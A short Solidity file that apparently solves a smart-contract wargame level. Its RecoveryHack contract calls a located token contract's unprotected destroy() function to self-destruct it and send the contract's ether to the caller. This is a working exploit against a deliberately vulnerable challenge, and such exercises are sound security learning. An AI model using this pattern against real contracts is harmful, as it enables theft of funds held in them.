pragma solidity 0.8.7;

/**
 * You have to find the address of the token contract that is created at the first time (I found it on etherscan)
 */

interface ISimpleToken {
    function transfer(address _to, uint _amount) external;
    function destroy(address payable _to) external;
}

contract RecoveryHack {
  function attack(address _tokenVictim) public {
      ISimpleToken(_tokenVictim).destroy(payable(tx.origin));
  }
}